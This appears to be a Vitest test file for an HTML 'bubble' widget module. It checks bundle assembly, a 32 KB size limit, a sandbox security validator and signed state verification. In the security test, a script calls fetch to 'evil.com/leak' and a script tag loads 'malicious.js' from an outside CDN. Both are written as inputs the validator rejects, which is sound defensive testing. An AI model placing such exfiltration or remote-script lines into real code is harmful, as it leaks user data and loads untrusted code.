import { describe, expect, it } from 'vitest';
import {
  HtmlBubbleSecurityError,
  HtmlBubbleSizeLimitError,
  createHtmlBubblePayload,
  signBubbleState,
  verifyBubbleState,
} from '../src/tma/bubbles.js';

describe('HTMLBubbles', () => {
  const token = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';

  it('creates valid bubble bundle within 32 KB limit', () => {
    const payload = createHtmlBubblePayload({
      html: '<div id="game">Score: <span id="s">0</span></div>',
      css: '#game { color: blue; }',
      script: 'let score = 0; console.log("started");',
      initialState: { level: 1, highScore: 100 },
    });

    expect(payload.bundle).toContain('<style>#game { color: blue; }</style>');
    expect(payload.bundle).toContain('<div id="game">Score: <span id="s">0</span></div>');
    expect(payload.bundle).toContain('<script type="application/json" id="__STATE__">');
    expect(payload.byteLength).toBeLessThan(32_768);
  });

  it('throws HtmlBubbleSizeLimitError when payload exceeds byte budget', () => {
    const hugeHtml = `<div>${'X'.repeat(40_000)}</div>`;
    expect(() =>
      createHtmlBubblePayload({
        html: hugeHtml,
      }),
    ).toThrowError(HtmlBubbleSizeLimitError);
  });

  it('blocks forbidden external network requests via security sandbox validator', () => {
    expect(() =>
      createHtmlBubblePayload({
        html: '<div>Widget</div>',
        script: 'fetch("https://evil.com/leak")',
      }),
    ).toThrowError(HtmlBubbleSecurityError);

    expect(() =>
      createHtmlBubblePayload({
        html: '<script src="https://cdn.example.com/malicious.js"></script>',
      }),
    ).toThrowError(HtmlBubbleSecurityError);
  });

  it('signs and cryptographically verifies state integrity', () => {
    const state = { userId: 42, score: 9999, stage: 'boss' };
    const signature = signBubbleState(state, token);

    expect(verifyBubbleState(state, signature, token)).toBe(true);

    // Tampered state
    const tampered = { ...state, score: 10000 };
    expect(verifyBubbleState(tampered, signature, token)).toBe(false);
  });
});
